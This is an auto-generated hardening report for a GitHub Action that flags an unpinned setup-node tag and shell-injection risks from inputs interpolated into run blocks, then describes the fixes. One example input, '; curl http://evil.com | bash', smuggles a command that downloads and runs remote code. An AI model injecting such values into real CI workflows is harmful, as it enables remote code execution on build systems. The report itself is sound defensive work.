<!-- markdownlint-disable -->

# Hardening Report: TheStack-ai--pulser/v1.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **TheStack-ai--pulser/v1.0.0** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The action uses `actions/setup-node@v4`, which is pinned to a mutable tag (`@v4`) rather than an immutable 40-character commit SHA. This means the referenced action could be silently replaced with a different (potentially malicious) version without any change to this file, creating a supply-chain risk.

Locations:

- `action.yml:38`

### script-injection (severity: high)

Multiple `run:` blocks in action.yml directly interpolate `${{ inputs.* }}` expressions into shell commands (sub-rule a). This allows an attacker who controls the inputs to inject arbitrary shell commands:

1. `npm install -g pulser-cli@${{ inputs.version }}` — the `version` input is interpolated directly into an npm install command. A value like `; curl http://evil.com | bash` would execute arbitrary code.
2. `REPORT=$(pulser "${{ inputs.path }}" --format json ...)` — the `path` input is interpolated directly into a shell command substitution.
3. `pulser "${{ inputs.path }}" --format text ...` — same `path` input interpolated again.
4. `if [ "${{ inputs.strict }}" = "true" ]` — the `strict` input is interpolated directly into a shell conditional.

Fix: Move all `inputs.*` values into `env:` variables and reference them as quoted shell variables (e.g., `"$INPUT_VERSION"`, `"$INPUT_PATH"`, `"$INPUT_STRICT"`) instead of using `${{ }}` expressions inside `run:` blocks.

Locations:

- `action.yml:42`
- `action.yml:47`
- `action.yml:67`
- `action.yml:71`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Install pulser-cli"; move to env: map

Locations:

- `action.yml:48`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.path }}" appears directly in run: block of step "Run pulser"; move to env: map

Locations:

- `action.yml:54`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.path }}" appears directly in run: block of step "Run pulser"; move to env: map

Locations:

- `action.yml:76`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.strict }}" appears directly in run: block of step "Run pulser"; move to env: map

Locations:

- `action.yml:79`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed all findings in action.yml:
1. Pinned actions/setup-node@v4 to full commit SHA 49933ea5288caeca8642d1e84afbd3f7d6820020 (tag preserved as comment).
2. Moved all ${{ inputs.* }} expressions out of run: blocks into env: maps to prevent script injection:
   - inputs.version → INPUT_VERSION in 'Install pulser-cli' step
   - inputs.path → INPUT_PATH in 'Run pulser' step
   - inputs.strict → INPUT_STRICT in 'Run pulser' step
   All shell references now use safe environment variables ($INPUT_VERSION, $INPUT_PATH, $INPUT_STRICT) instead of inline ${{ }} expressions.

